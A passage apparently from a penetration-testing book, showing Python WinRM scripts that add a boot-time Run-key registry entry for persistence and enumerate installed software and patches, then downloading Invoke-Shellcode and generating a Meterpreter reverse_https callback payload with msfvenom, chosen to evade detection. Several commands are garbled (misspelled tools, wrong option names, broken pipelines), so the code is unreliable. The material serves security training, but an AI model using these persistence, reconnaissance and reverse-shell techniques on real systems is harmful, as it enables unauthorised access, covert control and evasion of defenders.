If we want to introduce a new application of our own to run at boot time we just need to make a new entry, let's take a crack at it. Seeing as this is a very common Registry location where we might want to write to, and the path is a bit long to keep typing repeatedly, we will put together a small script to handle the creation of our value in the appropriate place.

```python
import winrm
# Place Script Here
script = """
$regpath = "HKLM:software/microsoft/windows/currentversion/run"
$apppath = "$windir%/system32/calc.exe"
$name = "Calc"
Write-Host "Before"
Get-ItemProperty
"HKLM:software/microsoft/windows/currentversion/run"
Set-ItemProperty -path $regpath -name $name -value $apppath
Write-Host "After"
Get-ItemProperty
"HKLM:software/microsoft/windows/currentversion/run"
"""
ses = winrm.Session('172.16.85.130', auth=('sussurro','Abc123!'))
r = ses.run_ps(script)
print(r.std_out)
print(r.std_err)
```

This is a very simple script, but we'll take a quick walk through it. First, we should know that this is another place where PowerShell will trip over permissions if we are not an administrator. If we try to run the script as a normal user, we will get an error similar to Set-ItemProperty: Requested registry access is not allowed. So what we're doing here is first taking a quick look at what is already in the HKLM:\SOFTWARE\Windows\CurrentVersion\Run key in the way of values, as we discussed earlier in this section. We then set a variable to hold the path to our location in the Registry where we will be making our entry, called $regpath, and populating it with our location.

We also set the $apppath variable with the path to the application that we will be starting at, in this case, the Windows Calculator application, located at %windir%\system32\calc.exe, and the $name value which holds, in this case, the string "Calc" as the name of our intended value. The meat of our small script is the Set-ItemProperty cmdlet, which does exactly as we would think it might and adds a new value to our specified Registry key. We then call Set-ItemProperty with Set-ItemProperty -path $regpath -name $name -value $apppath to plug in the values from all of our variables, and away we we go into the Registry.

After this, we run Get-ItemProperty again so that we can see the fruits of our labor. We should see quite a bit of text scroll past, up with a nice view of our newly created value, as shown in Fig. 6.11.

We can also use the Registry to gather a variety of information on the system and environment that we are examining. Another interesting spot to look at HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall. This holds the uninstall information for the system, which can be of interest during a penetration test. Here we can find information such as the application name, when it was installed, the major and minor versions, and quite a bit of other information. Let's put something together to retrieve this information.

```python
import winrm
# Place Script Here
script = """
"Installed Software "
Get-ChildItem
hklm:software/windows/currentversion/uninstall/ |
  ? {$_.ValueCount -gt 0 } |
  ForEach-Object { Write-Host $_.GetValue("DisplayName") \
  $_.GetValue("DisplayVersion") }
"Installed Patches"
get-winobject Win32_QuickFixEngineering | Select HotFixId, InstalledOn
"""
ses = winrm.Session('172.16.85.130', auth=('sussurro', 'Abc123!'))
r = ses.run_ps(script)
print(r.std_out)
```

Looking at the script, the first line of our script prints out our header of "Installed Software." Then we have a complex line that gets and filters data. The Get-ChildItem will get the list of all the software in the uninstall key. We only want keys with the subkeys that will have information about our installed software, so we use the "{$_.ValueCount-gt 0" filter to indicate we only want to see items that have a ValueCount greater than 0. From there we get the DisplayName and Display Version and print those out. That will give us the software name and version for output.

Next we query the Win32_QuickFixEngineering wmi table. This table contains the list of all the patches installed, but we only want two items, the patch and the install date. We use select to just pull those items out, and then are are output to the screen.

As a result, we should have output similar to that shown in Fig.6.12. A live host will likely have much more information in it, as it will include only software that has been installed by the user but also additional items that have been installed as part of the OS, entries from patches, and so on.

## Customizing Invoke-Shellcode

We don't want to run the script off the Internet, so our first step is to download it on Kali. We can use wget to get the file: wget https://raw.githubusercontent.com/PowerShellMafia/Sploit/shellcode.ps1. This will bring the file from github in raw form to our system

Next, we need to generate some shellcode to execute. Inside Kali, we can use msvenom to generate the code to include in our script. Msvenom is a metasploit script that will create shellcode for us, just have to pick the payload. For this example, we are going to use the windows/x64/meterpreter/reverse_https payload so that staged shellcode won't be easily viewed by host or network detection software. This payload requires two options: the callback host and the callback port.

```bash
msvenom -f c -p windows/x64/meterpreter/reverse_https \
LHOST=<kali IP>PORT=8675 EXITFUNC=thread | tr -d """" |\nperl -e 'while(><>) { $_ =~ s/\\x/\\x/g; print $_ }' \
sed 's/'\''//g' | sed 's/$//'
```

We are calling msvenom with C formatting by specifying the f c option. This isn't the output we are using, but it's easy enough to convert. We specify our payload with the -p option, and then specify our listening host (LHOST) and our listening port (LPORT). Remember to substitute your Kali instance's IP address for the LHOST value. Finally, we tell msvenom to create a payload that is threaded so don't have our process die when it's finished. The output from this will be a big block of code surrounded in quotation marks. We don't want those, so we pipe into the tr command to delete the double quotes from the output.
